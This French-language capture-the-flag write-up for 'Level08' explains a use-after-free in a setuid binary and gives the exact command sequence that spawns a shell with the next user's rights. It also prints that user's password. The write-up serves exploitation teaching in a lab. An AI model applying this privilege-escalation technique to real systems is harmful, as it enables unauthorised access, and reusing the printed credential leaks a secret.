# Level08

## Démarche

1. **Reconnaissance**

   **Permissions / SUID.** Le binaire `level8` appartient à l'utilisateur `level9`
   et porte le bit **setuid** :

   ```bash
   ls -l level8
   -rwsr-s---  1 level9 level8 ... level8
         ^
         bit setuid
   ```

   Conséquence : quand on lance l'exécutable, il s'exécute avec les **droits de son
   propriétaire (level9)**, pas ceux de celui qui le lance (level8). Donc si on
   parvient a lui faire ouvrir un shell (`system("/bin/sh")`), ce shell tourne
   **avec les droits de level9** et peut lire `/home/user/level9/.pass`.

   **Analyse ** Le `main` est une **boucle** :
   - deux variables globales reperé par leur adressage type x8049
   - elle commence par un `printf` qui affiche **deux variables globales**
     (format `"%p, %p \n"`) ;
   - puis elle lit sur l'**entree standard** la ligne tapee par l'utilisateur
     (`fgets(buffer, 128, stdin)`) ;
   - ensuite viennent **plusieurs niveaux de comparaison** : la ligne est comparee
     a differents mots-cles, et chaque correspondance **debloque une action**
     differente (allouer, liberer, dupliquer...).

   C'est donc un **interpreteur de commandes** qui boucle tant qu'il recoit des
   lignes

2. **Faille : use-after-free**

   **Reperage des mots a matcher (gdb).** A Chaque tour de boucle, les mots-cles sont
   compares a l'entree. En posant un breakpoint au main qui revient a chaque tour de boucle on a l'information sur chaque mot.
   ```console
   (gdb) break *main
    Breakpoint 1 at 0x8048564
   (gdb) x/s 0x8048819
   0x8048819:  "auth "
   (gdb) x/s 0x804881f
   0x804881f:  "reset"
   (gdb) x/s 0x8048825
   0x8048825:  "service"
   (gdb) x/s 0x804882d
   0x804882d:  "login"
   (gdb) x/s 0x8048833
   0x8048833:  "/bin/sh"
   ```

   **Recap des actions par commande :**

   | Commande | Action |
   |----------|--------|
   | `auth <arg>`    | `malloc(4)` -> globale_A ; `*globale_A = 0` ; `strcpy(globale_A, arg)` |
   | `reset`         | `free(globale_A)` **sans remettre le pointeur a NULL** (le bug) |
   | `service <arg>` | `strdup(arg)` -> globale_B |
   | `login`         | si `*(globale_A + 0x20) != 0` -> `system("/bin/sh")` |

   Les deux globales sont celles affichees par le `printf("%p, %p")` : c'est **grace
   a cet affichage** qu'on suit en direct leurs valeurs (globale_B, globale_A).

   **Deroule tour par tour** (sortie reelle du programme) :

   ```console
   ./level8
   (nil), (nil)
   auth AAAA
   0x804a008, (nil)              <- auth : globale_A = 0x804a008 (malloc)
   reset
   0x804a008, (nil)              <- reset : free(0x804a008), mais globale_A garde l'adresse
   service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
   0x804a008, 0x804a018          <- service : globale_B = 0x804a018 (strdup), voisin
   login
   $ cat /home/user/level9/.pass
   c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
   $
   0x804a008, 0x804a018
   ```

   **Le use-after-free.** Au `reset`, `free(globale_A)` libere le chunk
   `0x804a008`, mais `globale_A` **continue de pointer dessus** (pointeur pendant /
   dangling, jamais remis a NULL). Or la memoire liberee n'est pas rendue au noyau :
   l'allocateur  la **conserve dans des listes de chunks libres** pour la
   reutiliser plus tard. C'est une optimisation qui evite de redemander de la
   memoire au systeme (moins d'appels systeme). Le chunk libere
   reste donc disponible et son contenu n'est pas efface.

   Au `service`, `strdup` fait un `malloc` interne qui **reutilise cet espace libere**
   (ou en alloue un voisin immediat), et y **copie les donnees qu'on controle** 
   . Comme `globale_A` pointe toujours sur cette zone, on controle desormais ce
   que `globale_A` "voit".

   **Pourquoi ecrire a chunk + 0x20.** La condition de victoire (commande `login`)
   lit precisement a l'offset `0x20` (32 octets) du chunk :

   ```x86asm
   mov  0x8049aac,%eax     ; eax = globale_A = 0x804a008 (chunk, libere)
   mov  0x20(%eax),%eax    ; eax = *(chunk + 0x20) = *(0x804a028)
   test %eax,%eax
   je   ...                ; si 0 -> pas de shell ("Password")
   call system             ; si != 0 -> system("/bin/sh")
   ```

   Il faut donc que `*(chunk + 0x20)` soit **non nul**. En fournissant a `service`
   une chaine assez longue (40 `A`), les donnees copiees par `strdup` s'etendent
   jusqu'a couvrir l'adresse `0x804a008 + 0x20 = 0x804a028`. La comparaison passe  `system("/bin/sh")` est appelé.

3. **implémentation**

   On enchaine les 4 commandes, en gardant stdin ouvert (`cat`) pour pouvoir
   utiliser le `/bin/sh` obtenu :

   ```bash
    ./level8 
    (nil), (nil) 
    auth AAAA
    0x804a008, (nil) 
    reset
    0x804a008, (nil) 
    service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    0x804a008, 0x804a018 
    login
    $ cat /home/user/level9/.pass
    c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
   ```

